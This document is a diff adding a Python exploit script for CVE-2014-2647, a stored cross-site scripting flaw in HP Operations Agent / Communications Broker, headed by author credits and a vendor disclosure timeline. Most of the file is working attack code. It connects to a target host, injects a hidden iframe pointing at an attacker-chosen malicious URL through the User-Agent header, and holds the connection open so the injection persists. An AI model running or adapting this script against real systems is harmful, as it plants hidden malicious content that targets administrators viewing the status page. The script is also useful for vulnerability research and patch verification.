@@ -1,0 +1,89 @@
+#!/usr/bin/python
+# Exploit Title: HP Operations Agent / HP Communications Broker Remote XSS iFrame Injection
+# Date: 10/16/2014
+# Exploit Author: Matt Schmidt (Syph0n)
+# Vendor Homepage: www.hp.com
+# Version: HP Operations Manager/Operations Agent / OpenView Communications Broker < 11.14
+# Tested on: Windows 7, SunOS, RHEL Linux
+# CVE : CVE-2014-2647
+#
+# This script was written to exploit a remote cross-site scripting vulnerability in HP Communication Broker/ HP Operations Agent.
+# This vulnerability is stored in nature until the connection is terminated as it adds the XSS string to the User Agent.
+# Vulnerable page: /Hewlett-Packard/OpenView/BBC/status
+# This Exploit injects a Hidden iFrame which can be used for Social Engineering attacks as a browser exploit or other malicious URL can be embedded.
+#
+# Vulnerability Discovered by: Matt Schmidt (Syph0n)
+# Timeline:
+#	07/07/2014 - Submitted Discovery to ZDI
+#	07/08/2014 - ZDI decided not to accept this vulnerability and directed to HP SSRT.
+#	07/12/2014 - Contacted HP SSRT
+#	07/13/2014 - HP SSRT assigned Case SSRT101643
+#	07/17/2014 - Submitted Discovery and PoC exploit code to HP SSRT
+#	07/30/2014 - Followed up with HP
+#	07/31/2014 - Response from HP Indicating they need more time for Engineering to look into the submission
+#	08/13/2014 - Followed up with HP
+#	08/13/2014 - Response from HP stating that this issue will be resolved in version OA 11.14
+#	08/24/2014 - Followed up with HP on CVE Identified and Disclosure Date
+#	08/31/2014 - Followed up with HP again as no response to previous email
+#	09/04/2014 - Followed up with HP again as no response to previous two emails
+#	09/14/2014 - Followed up with HP again as no response to previous three emails
+#	09/16/2014 - HP Responded stating they where "sorting out various items concerning this issue"
+#	10/01/2014 - Followed up with HP asking for Disclosure Date and CVE Identifier
+#	10/06/2014 - HP Responded indicating a disclosure was due out the week of the 6th.
+#	10/15/2014 - HP Issued the following Security Bulletin regarding this vulnerability - https://h20564.www2.hp.com/portal/site/hpsc/public/kb/docDisplay?docId=emr_na-c04472444
+#	10/15/2014 - CVE-2014-2647 Issued for this vulnerability
+
+import argparse, socket, sys
+
+
+# Define Help Menu
+if (len(sys.argv) < 2) or (sys.argv[1] == '-h') or (sys.argv[1] == '--help'):
+    print '\nUsage: ./exploit.py <TargetIP> <iFrame URL> [Port]\n'
+    print '    <TargetIP>: The Target IP Address'
+    print '    <iFrame URL>: Malicious URL that will be injected as a hidden iframe\n'
+    print 'Options:'
+    print '	 [--port]: The port the HP Communications Broker is running on, default is 383'
+    sys.exit(1)
+
+# Parse Arguments
+parser = argparse.ArgumentParser()
+parser.add_argument("TargetIP")
+parser.add_argument("iFrameURL")
+parser.add_argument("--port", type=int, default=383)
+args = parser.parse_args()
+
+# Define User Agent to be spoofed
+agent = 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)'
+
+
+# Define Variables
+host = args.TargetIP
+port = args.port
+iFrameURL = args.iFrameURL
+
+def main():
+	# Malicious hidden iframe payload that takes input from args.iFrameURL and fake UserAgent from agent_list
+	payload = "GET /Hewlett-Packard/OpenView/BBC/status HTTP/1.1\r\nUser-Agent: <iframe height='0' width='0' style='visibility:hidden;display:none' src='"+iFrameURL+"'></iframe><a>"+ agent +"</a>\r\n\r\n"
+
+	# Create Socket and check connection to target.
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	print "[*] Checking host: " +host+"\n"
+	try:
+		s.connect((host, int(port)))
+	except Exception as e:
+		print "[+] Error Connecting: ", e
+		exit()
+	print "[*] Sending payload to HP OpenView HTTP Communication host " +host+"\n"
+	
+	# Keep connection alive
+	while payload != 'q':
+		s.send(payload.encode())
+		
+		data = s.recv(1024)
+		print "[*] Payload Sent."
+				
+		payload = raw_input("\n[+] Keeping Connection Open ([q]uit):")
+	return
+
+if __name__ == '__main__':
+	main()
